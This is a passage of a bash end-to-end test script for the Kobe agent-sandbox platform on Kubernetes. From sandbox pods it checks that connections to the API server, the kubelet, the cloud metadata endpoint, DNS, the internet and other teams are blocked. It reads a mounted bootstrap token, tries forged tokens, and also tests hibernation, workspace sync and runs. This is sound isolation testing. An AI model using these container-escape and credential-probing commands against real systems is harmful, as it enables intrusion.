  local name="tprobe-$RANDOM$RANDOM" phase="" i
  team_pod "$TEAM_NS" "$name" "$1" || { echo "team probe could not start"; return; }
  for i in $(seq 1 180); do
    phase=$($KUBECTL -n "$TEAM_NS" get pod "$name" -o jsonpath='{.status.phase}' 2>/dev/null || true)
    [[ "$phase" == Succeeded || "$phase" == Failed ]] && break
    sleep 2
  done
  $KUBECTL -n "$TEAM_NS" logs "$name" 2>/dev/null || true
}
listener='mkdir -p /tmp/w && echo REACHED > /tmp/w/index.html && httpd -f -p 8080 -h /tmp/w'
start_listener() { # namespace → name of a running HTTP listener on 8080 there
  local name="listener-$RANDOM"
  team_pod "$1" "$name" "$listener"
  $KUBECTL -n "$1" wait --for=condition=Ready "pod/$name" --timeout=120s >/dev/null 2>&1 || true
  echo "$name"
}

# A second team (its own namespace) with a listener: sandboxes of one team must not reach it.
handle2=$( (ensure_sandbox 8e3f3c4d-2e5f-4a7b-8c1d-2e3f4a5b6c7d e2e2 || true) | tail -1)
contains "a second team gets its own sandbox namespace" '^kobe-team-e2e2$' "$(json_field namespace "$handle2")"
other_listener=$(start_listener "$TEAM2_NS")
other_ip=$($KUBECTL -n "$TEAM2_NS" get pod "$other_listener" -o jsonpath='{.status.podIP}' 2>/dev/null || true)

svc_ip() { $KUBECTL -n "$NS" get svc "$1" -o jsonpath='{.spec.clusterIP}'; }
server_ip=$(svc_ip kobe-server || true); web_ip=$(svc_ip kobe-web || true); bifrost_ip=$(svc_ip kobe-bifrost || true)
mg_ip=$(svc_ip kobe-model-gateway || true)
dns_ip=$($KUBECTL -n kube-system get svc kube-dns -o jsonpath='{.spec.clusterIP}' || true)
api_ip=$($KUBECTL -n default get svc kubernetes -o jsonpath='{.spec.clusterIP}' || true)
node_ip=$($KUBECTL get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}' || true)
tcp() { # label host port → "label=REACHED|BLOCKED" (TCP connect only)
  echo "nc -w 4 $2 $3 </dev/null >/dev/null 2>&1 && echo $1=REACHED || echo $1=BLOCKED;"
}
targets="$(tcp api "$api_ip" 443) $(tcp apiserver "$node_ip" 6443) $(tcp kubelet "$node_ip" 10250)"
# Diagnostics: an unlabelled listener in the release namespace on 8080 and 9090 (not asserted;
# shows how the CNI applies the team egress policy's selectors).
PODS+=("-n $NS diag-listener")
$KUBECTL -n "$NS" run diag-listener --restart=Never --image=busybox:1.37 --command -- sh -c \
  'mkdir -p /tmp/w && echo ok > /tmp/w/index.html && (httpd -p 9090 -h /tmp/w &) && httpd -f -p 8080 -h /tmp/w' >/dev/null
$KUBECTL -n "$NS" wait --for=condition=Ready pod/diag-listener --timeout=120s >/dev/null 2>&1 || true
diag_ip=$($KUBECTL -n "$NS" get pod diag-listener -o jsonpath='{.status.podIP}' 2>/dev/null || true)
web_pod_ip=$($KUBECTL -n "$NS" get pods -l app.kubernetes.io/component=web -o jsonpath='{.items[0].status.podIP}' 2>/dev/null || true)
# Controls first: the destinations the sandbox must not reach are up and reachable from the
# release namespace, so BLOCKED below is the sandbox policy, not a dead target.
wait_endpoints "$NS" kobe-server kobe-web kobe-bifrost kobe-model-gateway
controls=$(probe "$NS" "$(retry "$(answers http://$server_ip/healthz)"); \
  $(retry "nc -w 3 $api_ip 443 </dev/null"); $(retry "nc -w 3 $node_ip 10250 </dev/null"); \
  $(tcp api "$api_ip" 443) $(tcp kubelet "$node_ip" 10250) \
  wget -qO- -T 5 http://$server_ip/healthz >/dev/null 2>&1 && echo user-api=REACHED || echo user-api=BLOCKED")
contains "control: the API Service is reachable from the release namespace" '^api=REACHED$' "$controls"
contains "control: the kubelet is reachable from the release namespace" '^kubelet=REACHED$' "$controls"
contains "control: the user API is reachable from the release namespace" '^user-api=REACHED$' "$controls"
# A new pod joins the CNI's policy ipsets after a delay: the sandbox probes run only once the
# sandbox port (the positive control from the same pod) answers, so BLOCKED is the policy. Allow
# 180 s, the budget of the loop this replaced; admitted-after records how long it took.
# Team-probe prefix: the sandbox port is the positive control from the same pod. On timeout it
# prints sandbox-port=BLOCKED and <label>=UNTESTED and ends the probe, so every check after fails.
sandbox_port_gate() { # label
  echo "t0=\$(date +%s); if ! $(retry "$(answers http://$server_ip:8081/healthz)" 180); then \
echo sandbox-port=BLOCKED; echo $1=UNTESTED; exit 0; fi; echo admitted-after=\$((\$(date +%s) - t0))s;"
}
egress=$(team_probe "$(sandbox_port_gate egress) \
  wget -qO- -T 5 http://${diag_ip:-0.0.0.0}:8080/ >/dev/null 2>&1 && echo diag-8080=REACHED || echo diag-8080=BLOCKED; \
  wget -qO- -T 5 http://${diag_ip:-0.0.0.0}:9090/ >/dev/null 2>&1 && echo diag-9090=REACHED || echo diag-9090=BLOCKED; \
  wget -qO- -T 5 http://${web_pod_ip:-0.0.0.0}:8080/api/healthz >/dev/null 2>&1 && echo web-pod=REACHED || echo web-pod=BLOCKED; \
  wget -qO- -T 5 http://$server_ip:8081/healthz >/dev/null 2>&1 && echo sandbox-port=REACHED || echo sandbox-port=BLOCKED; \
  wget -qO- -T 5 http://$server_ip/healthz >/dev/null 2>&1 && echo user-api=REACHED || echo user-api=BLOCKED; \
  wget -qO- -T 5 http://$bifrost_ip:8080/health >/dev/null 2>&1 && echo bifrost=REACHED || echo bifrost=BLOCKED; \
  wget -qO- -T 5 http://${mg_ip:-0.0.0.0}/healthz >/dev/null 2>&1 && echo model-gateway=REACHED || echo model-gateway=BLOCKED; \
  wget -qO- -T 5 http://$web_ip/api/healthz >/dev/null 2>&1 && echo web=REACHED || echo web=BLOCKED; \
  wget -qO- -T 5 http://${other_ip:-0.0.0.0}:8080/ >/dev/null 2>&1 && echo other-team=REACHED || echo other-team=BLOCKED; \
  wget -qO- -T 5 http://169.254.169.254/ >/dev/null 2>&1 && echo metadata=REACHED || echo metadata=BLOCKED; \
  $targets \
  nslookup kubernetes.default.svc.cluster.local $dns_ip >/dev/null 2>&1 && echo dns=REACHED || echo dns=BLOCKED; \
  wget -qO- -T 5 http://1.1.1.1/ >/dev/null 2>&1 && echo internet=REACHED || echo internet=BLOCKED; \
  wget -qO- -T 5 -S --post-data= --header \\\"Authorization: Bearer \$(cat /var/run/secrets/kobe/bootstrap-token)\\\" \
    http://$server_ip:8081/v1/sandbox/session 2>&1 | grep -o 'HTTP/1.1 [0-9]*' | sed 's/^/bootstrap=/'; \
  wget -qO- -T 5 -S --post-data= --header 'Authorization: Bearer forged.token.value-xxxxxxxxxx' \
    http://$server_ip:8081/v1/sandbox/session 2>&1 | grep -o 'HTTP/1.1 [0-9]*' | sed 's/^/forged=/'")
printf '     egress from a sandbox: %s\n' "$(printf '%s' "$egress" | tr '\n' ' ')"
contains "sandboxes reach the server's sandbox port" '^sandbox-port=REACHED$' "$egress"
contains "sandboxes cannot reach the web pod directly" '^web-pod=BLOCKED$' "$egress"
contains "sandboxes cannot reach the server's user API port" '^user-api=BLOCKED$' "$egress"
contains "sandboxes reach the model-gateway shim (KOBE-40)" '^model-gateway=REACHED$' "$egress"
contains "sandboxes cannot reach Bifrost directly (only through the token-verifying shim)" '^bifrost=BLOCKED$' "$egress"
contains "sandboxes cannot reach other Kobe services (web)" '^web=BLOCKED$' "$egress"
contains "sandboxes cannot reach another team's pods" '^other-team=BLOCKED$' "$egress"
contains "sandboxes cannot reach the Kubernetes API Service" '^api=BLOCKED$' "$egress"
contains "sandboxes cannot reach the API server on the node" '^apiserver=BLOCKED$' "$egress"
contains "sandboxes cannot reach the kubelet" '^kubelet=BLOCKED$' "$egress"
contains "sandboxes cannot reach a cloud metadata endpoint" '^metadata=BLOCKED$' "$egress"
contains "sandboxes get no DNS (no exfiltration channel)" '^dns=BLOCKED$' "$egress"
contains "sandboxes cannot reach the internet directly" '^internet=BLOCKED$' "$egress"
contains "an unclaimed sandbox pod's bootstrap token is recognised but not assigned (409)" '^bootstrap=HTTP/1.1 409$' "$egress"
contains "a forged bootstrap token is refused (401)" '^forged=HTTP/1.1 401$' "$egress"
contains "the sandbox session endpoint is not exposed through the ingress" 'HTTP/1.1 (401|404)' \
  "$(ingress POST /v1/sandbox/session '{}')"

# Inbound: a listener in the team namespace is unreachable; the same listener elsewhere is reachable.
team_listener=$(start_listener "$TEAM_NS")
$KUBECTL create namespace "$SANDBOX_NS" --dry-run=client -o yaml | $KUBECTL apply -f - >/dev/null
PODS+=("-n $SANDBOX_NS control-listener")
$KUBECTL -n "$SANDBOX_NS" run control-listener --restart=Never --image=busybox:1.37 --command -- sh -c "$listener" >/dev/null
$KUBECTL -n "$SANDBOX_NS" wait --for=condition=Ready pod/control-listener --timeout=120s >/dev/null 2>&1 || true
team_ip=$($KUBECTL -n "$TEAM_NS" get pod "$team_listener" -o jsonpath='{.status.podIP}' 2>/dev/null || true)
control_ip=$($KUBECTL -n "$SANDBOX_NS" get pod control-listener -o jsonpath='{.status.podIP}' 2>/dev/null || true)
inbound=$(probe "$NS" "$(gated "http://${control_ip:-0.0.0.0}:8080/" sandbox "http://${team_ip:-0.0.0.0}:8080/")")
contains "the team listener is up (so BLOCKED below means the policy)" '^Running$' \
  "$($KUBECTL -n "$TEAM_NS" get pod "$team_listener" -o jsonpath='{.status.phase}')"
contains "a listener outside team namespaces is reachable (control)" '^control=REACHED$' "$inbound"
contains "nothing can connect into a sandbox (no inbound)" '^sandbox=BLOCKED$' "$inbound"

# KOBE-24: the sandbox wire on the sandbox listener (8081). The e2e sandbox above belongs to a user
# and team that only exist in Kubernetes so far; give them database rows (account, team, membership)
# so the wire's liveness + principal checks can pass, mint session tokens inside the server pod with
# the real per-audience keys, and send raw WebSocket upgrades from a sandbox-like pod.
echo "==> sandbox wire (KOBE-24)"
psql_kobe "INSERT INTO users (id, name, email, email_verified) VALUES ('$E2E_USER_ID', 'E2E sandbox user', 'sandbox-user@e2e.test', true) ON CONFLICT DO NOTHING;
  INSERT INTO teams (id, slug, name) VALUES ('$E2E_TEAM_ID', 'e2e', 'E2E') ON CONFLICT DO NOTHING;
  INSERT INTO team_members (team_id, user_id, role) VALUES ('$E2E_TEAM_ID', '$E2E_USER_ID', 'member') ON CONFLICT DO NOTHING;" >/dev/null
mint() { # audience [sub] [user-id] → a session token signed in the server pod with that audience's key
  $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "
    const { signSessionToken } = await import('/app/dist/sandbox/session-token.js');
    const { sessionKeyEnvName } = await import('/app/dist/sandbox/config.js');
    const [aud, sub, user_id] = process.argv.slice(1);
    const now = Math.floor(Date.now() / 1000);
    console.log(signSessionToken({ iss: 'kobe-server', aud, sub, team_id: '$E2E_TEAM_ID',
      user_id, iat: now, exp: now + 600,
      jti: 'e2e-' + now + '-' + Math.random().toString(36).slice(2) }, process.env[sessionKeyEnvName(aud)]));
  " "$1" "${2:-${sandbox_id:-00000000-0000-4000-8000-000000000000}}" "${3:-$E2E_USER_ID}" 2>&1 | tail -1
}
wire_token=$(mint kobe.sandbox-wire)
gateway_token=$(mint kobe.model-gateway)
dead_token=$(mint kobe.sandbox-wire 00000000-0000-4000-8000-0000000000de)
upgrade() { # label token → "label=HTTP/1.1 <status>" (raw request: busybox has no WebSocket client)
  # stdin stays open: a half-closed socket (nc after EOF) is not upgraded by ws, unlike a real client.
  echo "(printf 'GET /v1/sandbox/connect HTTP/1.1\r\nHost: kobe-server\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Protocol: kobe.sandbox.v1\r\nAuthorization: Bearer $2\r\n\r\n'; sleep 4) \
    | nc -w 5 $server_ip 8081 2>/dev/null | head -1 | grep -o 'HTTP/1.1 [0-9]*' | sed 's/^/$1=/';"
}
# Gated like the egress probe: the upgrades run only once the sandbox port answers this pod.
wire=$(team_probe "$(sandbox_port_gate wire) \
  $(upgrade valid "$wire_token") $(upgrade forged forged.token.value-xxxxxxxxxx) \
  $(upgrade gateway "$gateway_token") $(upgrade dead "$dead_token") \
  wget -qO- -T 5 -S http://$server_ip:8081/v1/sandbox/connect 2>&1 | grep -o 'HTTP/1.1 [0-9]*' | head -1 | sed 's/^/plain=/'")
printf '     sandbox wire upgrades: %s\n' "$(printf '%s' "$wire" | tr '\n' ' ')"
contains "a sandbox with a live claim and a sandbox-wire token connects (101)" '^valid=HTTP/1.1 101$' "$wire"
contains "a forged token is refused at the upgrade (401)" '^forged=HTTP/1.1 401$' "$wire"
contains "a model-gateway token is refused by the wire (audience-bound, 401)" '^gateway=HTTP/1.1 401$' "$wire"
contains "a signed token for a sandbox that does not exist is refused (401)" '^dead=HTTP/1.1 401$' "$wire"
contains "the wire endpoint is not on the user-facing ingress" 'HTTP/1.1 (401|404)' \
  "$(ingress GET /v1/sandbox/connect)"

# KOBE-25: hibernate → wake (D14) with the real sandbox agent, and the cold-start harness (Pi ready).
# The e2e sandbox (KOBE-22) runs kobe-sandbox-agent; with the database rows above it trades its
# bootstrap token for session tokens and connects. Waits are bounded and end on a positive
# condition (never a fixed sleep before an assertion).
echo "==> hibernate and wake (KOBE-25)"
until_ok() { # seconds command... → succeeds as soon as the command does, fails after `seconds`
  local deadline=$((SECONDS + $1))
  shift
  until "$@"; do
    ((SECONDS >= deadline)) && return 1
    sleep 1
  done
}
wire_open() { [[ "$(psql_kobe "SELECT count(*) FROM sandbox_connections WHERE team_id = '$E2E_TEAM_ID' AND user_id = '$E2E_USER_ID' AND closed_at IS NULL")" == 1 ]]; }
sandbox_pod_name() { # the pod of the e2e sandbox (by its claim uid), if it has one
  $KUBECTL -n "$TEAM_NS" get pods -l "agents.x-k8s.io/claim-uid=${sandbox_id:-none}" \
    -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null | head -1
}
pod_running() { [[ "$($KUBECTL -n "$TEAM_NS" get pods -l "agents.x-k8s.io/claim-uid=${sandbox_id:-none}" \
  -o jsonpath='{.items[*].status.phase}' 2>/dev/null)" == Running ]]; }
pod_gone() { [[ -z "$($KUBECTL -n "$TEAM_NS" get pods -l "agents.x-k8s.io/claim-uid=${sandbox_id:-none}" -o name 2>/dev/null)" ]]; }
in_sandbox() { # shell command → its output inside the sandbox's agent container
  $KUBECTL -n "$TEAM_NS" exec "$(sandbox_pod_name)" -c agent -- sh -c "$1" 2>&1 || true
}
lifecycle() { # hibernate|wake → the CLI's answer (same path, lock and audit as the server)
  $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node dist/cli/lifecycle.js "$1" \
    --team-id "$E2E_TEAM_ID" --user-id "$E2E_USER_ID" 2>&1 | grep -E '^\{"(hibernated|woken)"' || true
}
claim_sandbox=$($KUBECTL -n "$TEAM_NS" get sandboxclaim "u-$E2E_USER_ID" -o jsonpath='{.status.sandbox.name}' 2>/dev/null || true)
if until_ok 240 wire_open; then ok "the real sandbox agent trades its bootstrap token and connects over the wire"
else
  fail "the real sandbox agent trades its bootstrap token and connects over the wire"
  $KUBECTL -n "$TEAM_NS" logs "$(sandbox_pod_name)" -c agent --tail=30 2>&1 | sed 's/^/     agent: /' || true
fi
contains "the agent can write its workspace and /tmp" '^written$' \
  "$(in_sandbox 'echo kobe-25 > /workspace/kobe-25-marker && echo tmp > /tmp/kobe-25-marker && echo written')"

# Cold start. Gate 1 (D14) is hibernated → FIRST TOKEN p50 ≤ 3 s, p95 ≤ 8 s over 20 trials; with
# no model gateway yet (KOBE-30/40/41) the harness measures hibernated → Pi ready (agent
# reconnected, Pi answering on a thread), a lower bound of first token. Same budgets, honestly
# labelled; docs/ledger/KOBE-25.md records the numbers and the gap. A dedicated user gets its own
# sandbox (first wake: warm pool), so the harness never touches the e2e user's.
# The suite shard leaves these trials to the cold-start shard (the audit check below still runs).
trials=0
if [[ "$SHARD" != suite ]]; then
COLD_USER_ID=9b4c3d5e-6f7a-4b8c-9d0e-1f2a3b4c5d6e
psql_kobe "INSERT INTO users (id, name, email, email_verified) VALUES ('$COLD_USER_ID', 'E2E cold-start user', 'cold-start@e2e.test', true) ON CONFLICT DO NOTHING;
  INSERT INTO team_members (team_id, user_id, role) VALUES ('$E2E_TEAM_ID', '$COLD_USER_ID', 'member') ON CONFLICT DO NOTHING;" >/dev/null
cold_start() { # label trials spacing-ms → harness output (one JSON line per trial + summary)
  $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node dist/cli/cold-start.js \
    --team-id "$E2E_TEAM_ID" --user-id "$COLD_USER_ID" --probe pi --label "$1" --trials "$2" \
    --spacing-ms "$3" --p95-max-ms "${KOBE_COLD_START_P95_MS:-8000}" \
    ${KOBE_COLD_START_P50_MS:+--p50-max-ms "$KOBE_COLD_START_P50_MS"} 2>&1 || true
}
trials="${KOBE_COLD_START_TRIALS:-20}"
cold=$(cold_start back-to-back "$trials" 0)
printf '%s\n' "$cold" | sed 's/^/     cold-start: /'
summary=$(printf '%s\n' "$cold" | grep '"summary":true' || true)
contains "cold-start harness ran $trials back-to-back hibernate → wake trials through the server's wake path" "\"trials\":$trials" "$summary"
# Gated on p95 (Gate 1's criterion); D14's p50 ≤ 3 s target is reported (summary line) and gated
# only when KOBE_COLD_START_P50_MS is set: Pi ready alone measures ≈ 3.5 s on CI (ledger).
contains "hibernated → Pi ready (not first token) p95 ≤ ${KOBE_COLD_START_P95_MS:-8000} ms (back-to-back)" '"pass":true' "$summary"
# Spaced trials: each wake starts after the sandbox sat fully down for a while (nothing of the
# previous pod's start is still in flight on the node).
spaced=$(cold_start spaced "${KOBE_COLD_START_SPACED_TRIALS:-5}" "${KOBE_COLD_START_SPACING_MS:-30000}")
printf '%s\n' "$spaced" | sed 's/^/     cold-start: /'
spaced_summary=$(printf '%s\n' "$spaced" | grep '"summary":true' || true)
contains "hibernated → Pi ready (not first token) p95 ≤ ${KOBE_COLD_START_P95_MS:-8000} ms (spaced trials)" '"pass":true' "$spaced_summary"
# Where an agent start spends its time (startup, session trade attempts, wire ready): last pod.
cold_pod=$($KUBECTL -n "$TEAM_NS" get pods -l "kobe.splittingatom.io/user-id=$COLD_USER_ID" -o name 2>/dev/null | head -1)
[[ -z "$cold_pod" ]] && cold_pod=$($KUBECTL -n "$TEAM_NS" get sandboxclaim "u-$COLD_USER_ID" -o jsonpath='pod/{.status.sandbox.name}' 2>/dev/null || true)
$KUBECTL -n "$TEAM_NS" logs "$cold_pod" -c agent 2>/dev/null \
  | grep -E 'sandbox-agent starting|sandbox session (acquired|retry)|sandbox wire ready' | head -6 | sed 's/^/     agent: /' || true
contains "the harness cleaned up its thread" '^0$' \
  "$(psql_kobe "SELECT count(*) FROM threads WHERE team_id = '$E2E_TEAM_ID' AND owner_user_id = '$COLD_USER_ID'")"
fi # cold-start trials

contains "an idle sandbox can be hibernated" '"hibernated":true' "$(lifecycle hibernate)"
contains "hibernation suspends the agent-sandbox Sandbox" '^Suspended$' \
  "$($KUBECTL -n "$TEAM_NS" get sandbox "${claim_sandbox:-none}" -o jsonpath='{.spec.operatingMode}' 2>&1)"
if until_ok 120 pod_gone; then ok "a hibernated sandbox has no pod"; else fail "a hibernated sandbox has no pod"; fi
contains "its /workspace volume is kept" '^Bound$' \
  "$($KUBECTL -n "$TEAM_NS" get pvc "workspace-${claim_sandbox:-none}" -o jsonpath='{.status.phase}' 2>&1)"
contains "the server records it hibernated and closed its connection" '^hibernated\|0$' \
  "$(psql_kobe "SELECT s.state || '|' || (SELECT count(*) FROM sandbox_connections c WHERE c.team_id = s.team_id AND c.user_id = s.user_id AND c.closed_at IS NULL) FROM sandboxes s WHERE s.team_id = '$E2E_TEAM_ID' AND s.user_id = '$E2E_USER_ID'")"
contains "a hibernated sandbox can be woken" '"woken":true' "$(lifecycle wake)"
if until_ok 120 pod_running; then ok "waking starts a new pod"; else fail "waking starts a new pod"; fi
contains "the woken pod runs under gVisor" '^gvisor$' \
  "$($KUBECTL -n "$TEAM_NS" get pod "$(sandbox_pod_name)" -o jsonpath='{.spec.runtimeClassName}' 2>&1)"
if until_ok 120 wire_open; then ok "the woken sandbox reconnects"; else fail "the woken sandbox reconnects"; fi
contains "its /workspace survived hibernation" '^kobe-25$' "$(in_sandbox 'cat /workspace/kobe-25-marker')"
contains "its /tmp was wiped by hibernation" '^gone$' "$(in_sandbox 'test -e /tmp/kobe-25-marker && echo kept || echo gone')"
audit_counts=$(psql_kobe "SELECT (SELECT count(*) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'sandbox.hibernated' AND target->>'trigger' = 'operator') >= $((trials + 1)) AND (SELECT count(*) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'sandbox.woken') >= $((trials + 1))")
contains "every hibernation and wake is audited" '^t$' "$audit_counts"
if [[ "$SHARD" == cold-start ]]; then exit "$failed"; fi

# KOBE-27: /workspace ↔ S3 (dev/s3.yaml: SeaweedFS, a test-only fixture). A dedicated user, so
# destroying its volume never disturbs the sandboxes later sections use. Write a file, hibernate
# (the agent's final push), destroy the PVC, wake: the file must be back on the new, empty volume.
echo "==> workspace sync (KOBE-27)"
SYNC_USER_ID=5c6d7e8f-9a0b-4c1d-8e2f-3a4b5c6d7e8f
psql_kobe "INSERT INTO users (id, name, email, email_verified) VALUES ('$SYNC_USER_ID', 'E2E workspace sync user', 'workspace-sync@e2e.test', true) ON CONFLICT DO NOTHING;
  INSERT INTO team_members (team_id, user_id, role) VALUES ('$E2E_TEAM_ID', '$SYNC_USER_ID', 'member') ON CONFLICT DO NOTHING;" >/dev/null
sync_lifecycle() { # hibernate|wake → the CLI's answer
  $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node dist/cli/lifecycle.js "$1" \
    --team-id "$E2E_TEAM_ID" --user-id "$SYNC_USER_ID" 2>&1 | grep -E '^\{"(hibernated|woken)"' || true
}
sync_uid() { $KUBECTL -n "$TEAM_NS" get sandboxclaim "u-$SYNC_USER_ID" -o jsonpath='{.metadata.uid}' 2>/dev/null || true; }
sync_pod() {
  $KUBECTL -n "$TEAM_NS" get pods -l "agents.x-k8s.io/claim-uid=$(sync_uid)" \
    -o jsonpath='{range .items[?(@.status.phase=="Running")]}{.metadata.name}{"\n"}{end}' 2>/dev/null | head -1
}
sync_pod_gone() { [[ -z "$($KUBECTL -n "$TEAM_NS" get pods -l "agents.x-k8s.io/claim-uid=$(sync_uid)" -o name 2>/dev/null)" ]]; }
in_sync_sandbox() { $KUBECTL -n "$TEAM_NS" exec "$(sync_pod)" -c agent -- sh -c "$1" 2>&1 || true; }
sync_wire_open() { [[ "$(psql_kobe "SELECT count(*) FROM sandbox_connections WHERE team_id = '$E2E_TEAM_ID' AND user_id = '$SYNC_USER_ID' AND closed_at IS NULL")" == 1 ]]; }
sync_row() { psql_kobe "SELECT sha256 FROM workspace_files WHERE team_id = '$E2E_TEAM_ID' AND user_id = '$SYNC_USER_ID' AND path = 'reports/q3.md' AND NOT deleted"; }
sync_row_present() { [[ "$(sync_row)" =~ ^[0-9a-f]{64}$ ]]; }
SYNC_CONTENT="kobe-27 $(date +%s) $RANDOM"
sync_restored() { [[ "$(in_sync_sandbox 'cat /workspace/reports/q3.md')" == "$SYNC_CONTENT" ]]; }
ensure_sandbox "$E2E_TEAM_ID" e2e "$SYNC_USER_ID" >/dev/null || true
if until_ok 240 sync_wire_open; then ok "the workspace-sync user's sandbox connects"
else fail "the workspace-sync user's sandbox connects"; fi
contains "the sandbox holds no object-storage credentials or endpoint (env)" '^0$' \
  "$(in_sync_sandbox 'env | grep -ciE "s3|aws|secret.?access|access.?key" || true')"
contains "the agent can write a report into its workspace" '^written$' \
  "$(in_sync_sandbox "mkdir -p /workspace/reports && printf '%s' '$SYNC_CONTENT' > /workspace/reports/q3.md && echo written")"
contains "the idle sandbox hibernates" '"hibernated":true' "$(sync_lifecycle hibernate)"
if until_ok 120 sync_pod_gone; then ok "its pod is gone"; else fail "its pod is gone"; fi
# Pushed by the agent's final flush on the way down (the periodic push is 60 s; this is sooner).
if until_ok 60 sync_row_present; then ok "hibernation pushed the file to the durable copy (manifest row)"
else fail "hibernation pushed the file to the durable copy (manifest row): got [$(sync_row)]"; fi
sync_sha=$(sync_row)
contains "its content is in S3 under the team/user prefix, named by its hash" "$sync_sha" \
  "$($KUBECTL -n kobe-deps exec deploy/s3 -- sh -c "echo 'fs.ls /buckets/kobe/teams/$E2E_TEAM_ID/users/$SYNC_USER_ID/workspace/' | weed shell -master=localhost:9333" 2>&1 || true)"
sync_claim=$($KUBECTL -n "$TEAM_NS" get sandboxclaim "u-$SYNC_USER_ID" -o jsonpath='{.status.sandbox.name}' 2>/dev/null || true)
old_pvc=$($KUBECTL -n "$TEAM_NS" get pvc "workspace-${sync_claim:-none}" -o jsonpath='{.metadata.uid}' 2>/dev/null || true)
$KUBECTL -n "$TEAM_NS" delete pvc "workspace-${sync_claim:-none}" --wait=true --timeout=120s >/dev/null 2>&1 || true
new_pvc=$($KUBECTL -n "$TEAM_NS" get pvc "workspace-${sync_claim:-none}" -o jsonpath='{.metadata.uid}' 2>/dev/null || true)
if [[ -n "$old_pvc" && "$new_pvc" != "$old_pvc" ]]; then ok "the sandbox's /workspace volume is destroyed"
else fail "the sandbox's /workspace volume is destroyed (uid ${old_pvc:-none} → ${new_pvc:-none})"; fi
sync_wake_at=$SECONDS
contains "the sandbox is woken onto a new, empty volume" '"woken":true' "$(sync_lifecycle wake)"
if until_ok 240 sync_restored; then ok "the file is back after the volume was lost ($((SECONDS - sync_wake_at)) s after the wake)"
else
  fail "the file is back after the volume was lost: got [$(in_sync_sandbox 'cat /workspace/reports/q3.md' | tail -1)]"
  $KUBECTL -n "$TEAM_NS" logs "$(sync_pod)" -c agent --tail=30 2>&1 | sed 's/^/     agent: /' || true
fi
contains "a full restore onto an empty volume is audited" '^[1-9][0-9]*$' \
  "$(psql_kobe "SELECT count(*) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'workspace.restored' AND target->>'userId' = '$SYNC_USER_ID'")"
# Restore timing as the agent measured it (scan + manifest + downloads), for the ledger.
$KUBECTL -n "$TEAM_NS" logs "$(sync_pod)" -c agent 2>/dev/null | grep -E '"msg":"workspace restored"' | head -2 | sed 's/^/     agent: /' || true
# And on a plain wake (volume kept): the cold-start user's last pod (incremental check only).
$KUBECTL -n "$TEAM_NS" logs "${cold_pod:-none}" -c agent 2>/dev/null | grep -E '"msg":"workspace restored"' | head -1 | sed 's/^/     cold-start agent: /' || true

# KOBE-30: messages and runs through the server API against the in-cluster Postgres. No model or
# agent answers yet, so the run is stopped while its start waits for the (unwoken) sandbox.
echo "==> runs (KOBE-30)"
owner_id=$(psql_kobe "SELECT id FROM users WHERE email = 'owner@e2e.test'")
psql_kobe "INSERT INTO team_members (team_id, user_id, role) VALUES ('$E2E_TEAM_ID', '$owner_id', 'member') ON CONFLICT DO NOTHING;" >/dev/null
read -r -d '' RUNS_JS <<'JS' || true
const [team] = process.argv.slice(1);
const base = "http://127.0.0.1:" + process.env.PORT;
const origin = new URL(process.env.KOBE_PUBLIC_URL).origin;
const jar = new Map();
const call = async (method, path, body) => {
  const res = await fetch(base + path, {
    method,
    headers: {
      origin,
      "content-type": "application/json",
      "x-kobe-team": team,
      cookie: [...jar].map(([k, v]) => k + "=" + v).join("; "),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  for (const c of res.headers.getSetCookie()) {
    const [pair] = c.split(";");
    const at = pair.indexOf("=");
    jar.set(pair.slice(0, at), pair.slice(at + 1));
  }
  const text = await res.text();
  let json = {};
  try { json = JSON.parse(text); } catch {}
  return { status: res.status, json, text };
};
const out = (k, v) => console.log(k + "=" + v);
out("signin", (await call("POST", "/api/auth/sign-in/email", { email: "owner@e2e.test", password: "e2e owner password" })).status);
out("active", (await call("PUT", "/v1/me/teams/active", { teamId: team })).status);
const thread = await call("POST", "/v1/threads", { title: "e2e" });
const id = thread.json.thread_id;
const first = await call("POST", "/v1/threads/" + id + "/messages", { content: "hello" });
out("message", first.status + ":" + first.json.queued);
const second = await call("POST", "/v1/threads/" + id + "/messages", { content: "again" });
out("queued", second.status + ":" + second.json.queued + ":" + second.json.run_id);
out("run", (await call("GET", "/v1/runs/" + first.json.run_id)).json.status);
const pending = await call("GET", "/v1/threads/" + id + "/pending-messages");
out("pending", pending.status + ":" + (pending.json.messages || []).map((m) => m.status + "/" + m.content).join(","));
out("cancel", (await call("POST", "/v1/runs/" + first.json.run_id + "/cancel")).json.status);
out("paused", (await call("GET", "/v1/threads/" + id + "/runs")).json.queue_paused + ":" +
  (await call("GET", "/v1/runs/" + second.json.run_id)).json.status);
out("cancel2", (await call("POST", "/v1/runs/" + second.json.run_id + "/cancel")).json.status);
const events = await call("GET", "/v1/runs/" + first.json.run_id + "/events");
out("events", (events.text.match(/^event: .*$/gm) || []).map((l) => l.slice(7)).join(","));
out("retry", (await call("POST", "/v1/runs/" + first.json.run_id + "/retry")).json.code);
JS
runs_out=$($KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "$RUNS_JS" "$E2E_TEAM_ID" 2>&1 | tail -13)
printf '     runs: %s\n' "$(printf '%s' "$runs_out" | tr '\n' ' ')"
contains "a team member signs in and selects the team" '^active=200$' "$runs_out"
contains "a message starts a run at once on an idle thread" '^message=201:false$' "$runs_out"
contains "a second message queues behind the active run" '^queued=201:true:' "$runs_out"
contains "the run is running while its sandbox start is pending" '^run=running$' "$runs_out"
contains "pending messages: the active prompt, then the queue (KOBE-32)" '^pending=200:running/hello,queued/again$' "$runs_out"
contains "Stop cancels the active run" '^cancel=cancelled$' "$runs_out"
contains "Stop pauses the message queued behind it (KOBE-26)" '^paused=true:queued$' "$runs_out"
contains "Stop deletes the queued message (or stops it once it started)" '^cancel2=cancelled$' "$runs_out"
